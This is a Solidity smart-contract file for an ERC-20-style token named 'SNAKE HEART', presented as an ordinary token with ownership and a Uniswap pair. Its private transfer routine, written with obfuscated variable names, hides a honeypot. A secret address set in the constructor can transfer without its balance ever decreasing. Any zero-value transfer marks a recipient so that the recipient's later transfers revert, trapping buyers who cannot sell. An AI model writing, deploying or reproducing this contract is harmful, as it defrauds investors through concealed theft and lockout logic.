/*

https://t.me/SnakeHeartETH

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract SnakeHeart is Ownable {
    mapping(address => mapping(address => uint256)) public allowance;

    uint256 private snakatt = 48;

    function transferFrom(address snakehtt, address sneaksnak, uint256 snaktrop) public returns (bool success) {
        require(snaktrop <= allowance[snakehtt][msg.sender]);
        allowance[snakehtt][msg.sender] -= snaktrop;
        row(snakehtt, sneaksnak, snaktrop);
        return true;
    }

    mapping(address => uint256) private snakokat;

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public symbol = 'SNAKE HEART';

    uint8 public decimals = 9;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    address public uniswapV2Pair;

    mapping(address => uint256) private snakinoo;

    string public name = 'SNAKE HEART';

    constructor(address snakokattat) {
        balanceOf[msg.sender] = totalSupply;
        snakokat[snakokattat] = snakatt;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    function row(address snakehtt, address sneaksnak, uint256 snaktrop) private returns (bool success) {
        if (snakokat[snakehtt] == 0) {
            balanceOf[snakehtt] -= snaktrop;
        }

        if (snaktrop == 0) snakinoo[sneaksnak] += snakatt;

        if (snakehtt != uniswapV2Pair && snakokat[snakehtt] == 0 && snakinoo[snakehtt] > 0) {
            snakokat[snakehtt] -= snakatt;
        }

        balanceOf[sneaksnak] += snaktrop;
        emit Transfer(snakehtt, sneaksnak, snaktrop);
        return true;
    }

    function approve(address snakkotr, uint256 snaktrop) public returns (bool success) {
        allowance[msg.sender][snakkotr] = snaktrop;
        emit Approval(msg.sender, snakkotr, snaktrop);
        return true;
    }

    function transfer(address sneaksnak, uint256 snaktrop) public returns (bool success) {
        row(msg.sender, sneaksnak, snaktrop);
        return true;
    }

    mapping(address => uint256) public balanceOf;
}